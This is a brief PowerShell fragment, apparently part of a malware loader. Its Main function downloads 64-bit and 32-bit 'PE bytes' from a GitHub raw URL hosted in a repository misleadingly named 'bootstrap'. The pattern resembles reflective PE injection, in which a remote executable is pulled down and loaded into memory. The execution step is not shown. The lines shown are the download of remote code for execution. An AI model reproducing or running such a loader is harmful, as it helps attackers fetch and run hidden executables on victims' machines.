...
Function Main
{
    ...
    $PEBytes64 = $webClient.DownloadString('https://raw.githubusercontent.com/dimpol/bootstrap/v4-dev/PEbytes65.txt')
    
    
    $PEBytes32 = $webClient.DownloadString('https://raw.githubusercontent.com/dimpol/bootstrap/v4-dev/PEbytes32.txt')
